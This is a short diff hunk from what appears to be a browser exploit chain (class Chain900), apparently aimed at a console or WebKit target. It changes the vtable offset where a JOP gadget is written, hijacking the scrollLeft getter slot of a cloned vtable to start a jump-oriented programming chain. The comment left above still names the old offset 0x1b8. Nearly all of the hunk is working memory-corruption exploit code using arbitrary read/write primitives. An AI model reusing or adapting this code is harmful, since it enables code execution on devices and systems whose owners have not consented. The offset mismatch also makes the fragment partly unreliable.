@@ -521,7 +521,7 @@ class Chain900 extends Chain900Base {
         clone_p.write64(0, ta_p.read64(0));
 
         // 0x1b8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
+        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
